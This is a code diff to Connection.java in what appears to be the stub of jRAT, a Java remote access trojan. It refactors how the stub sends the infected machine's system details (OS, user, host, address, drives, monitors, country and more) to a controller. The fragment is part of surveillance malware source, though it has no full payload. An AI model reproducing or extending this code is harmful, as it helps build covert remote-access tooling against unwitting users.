@@ -1,9 +1,7 @@
 package se.jrat.stub;
 
-import java.awt.GraphicsEnvironment;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.io.File;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
@@ -26,16 +24,16 @@ import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
 import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
-import se.jrat.stub.packets.outgoing.Packet13Status;
 import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
-import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet15InitJavaPath;
+import se.jrat.stub.packets.outgoing.Packet16LoadedPlugins;
+import se.jrat.stub.packets.outgoing.Packet17InitDrives;
+import se.jrat.stub.packets.outgoing.Packet18InitMonitors;
+import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
+import se.jrat.stub.packets.outgoing.Packet2Status;
 import se.jrat.stub.packets.outgoing.Packet3Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
-import se.jrat.stub.packets.outgoing.Packet18InitMonitors;
-import se.jrat.stub.packets.outgoing.Packet17InitDrives;
-import se.jrat.stub.packets.outgoing.Packet16LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet7InitServerID;
 import se.jrat.stub.packets.outgoing.Packet8InitCountry;
@@ -136,8 +134,12 @@ public class Connection implements Runnable {
 	}
 
 	public static void initialize() throws Exception {
-		addToSendQueue(new Packet1InitHandshake());
-		
+		addToSendQueue(new Packet1InitHandshake());	
+		refreshInit();		
+		addToSendQueue(new Packet3Initialized());
+	}
+	
+	public static void refreshInit() {
 		addToSendQueue(new Packet4InitOperatingSystem());
 		addToSendQueue(new Packet5InitUserHost());	
 		addToSendQueue(new Packet6InitVersion());
@@ -153,8 +155,6 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet16LoadedPlugins());
 		addToSendQueue(new Packet17InitDrives());
 		addToSendQueue(new Packet18InitMonitors());	
-		
-		addToSendQueue(new Packet3Initialized());
 	}
 
 	public static void addToSendQueue(AbstractOutgoingPacket packet) {
@@ -244,11 +244,11 @@ public class Connection implements Runnable {
 	}
 
 	public static void status(String status) {
-		addToSendQueue(new Packet13Status(status));
+		addToSendQueue(new Packet2Status(status));
 	}
 
 	public static void status(int status) {
-		addToSendQueue(new Packet13Status(status + ""));
+		addToSendQueue(new Packet2Status(status + ""));
 	}
 
 	public static void lock() {
